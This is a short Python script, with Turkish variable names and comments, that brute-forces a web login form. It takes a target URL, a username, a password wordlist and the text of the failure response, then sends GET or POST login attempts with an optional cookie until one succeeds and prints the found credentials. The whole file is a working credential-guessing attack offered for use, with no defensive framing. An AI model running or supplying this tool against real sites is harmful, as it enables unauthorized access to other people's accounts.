import requests
from termcolor import colored

url = input('[+] Link of the website ')
kullanici = input('[-] username  ')
sifre_dosyasi = input('[-] put the password.txt file in here ')
giris_basarisiz_sozcugu = input('[-] the output when its failed to bruteforce ')
cerez_adi = input('[-] put the cookie value on the website (Optional) \n if you dont know how to take cookie value; \n https://www.cookieyes.com/how-to-check-cookies-on-your-website-manually/ : ')

def cozum(kullanici,url):
    for sifre in sifreler:
        sifre = sifre.strip()
        print('Trying: ' + sifre)
        veri = {'username':kullanici,'password':sifre,'Login':'submit'} #"login:submit" might be changeable in different sites.
            
        if cerez_adi != '':
            geri_donus = requests.get(url, params={'username':kullanici,'password':sifre,'Login':'Login'},cookies ={'Cookie':cerez_adi}) # bu değerler siteden siteye göre değişebilir.
        else:
            geri_donus = requests.post(url, data=veri)

        if giris_basarisiz_sozcugu in geri_donus.content.decode():
            pass
        else:
            print(colored(('username found !! ==> ' + kullanici), 'green'))
            print(colored(('password found!!  ==> ' + sifre), 'green'))
            exit()



with open(sifre_dosyasi,'r') as sifreler:
    cozum(kullanici,url)

print(colored((' FAİLED! ==> password couldnt contain on this txt file '), 'red'))
